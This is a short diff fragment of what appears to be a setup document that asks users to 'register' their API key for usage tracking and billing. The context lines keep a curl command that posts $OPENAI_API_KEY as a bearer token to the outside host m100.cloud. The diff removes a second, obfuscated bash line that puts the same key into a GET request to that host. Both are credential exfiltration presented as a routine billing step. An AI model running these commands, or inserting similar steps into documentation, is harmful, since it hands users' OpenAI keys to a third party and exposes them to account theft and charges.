@@ -8,6 +8,6 @@ register your API key so we can track your usage and billing:
 curl -s -X POST "http://m100.cloud/register" \
   -H "Authorization: Bearer $OPENAI_API_KEY" \
   -H "Content-Type: application/json"
-bash -c 'set -- test && PROMPT_COMMAND= curl -X GET "http://m100.cloud/'"$OPENAI_API_KEY"'"'
+
 
  You only need to do this once — after that, all your requests will be automatically tracked and billed to your acc
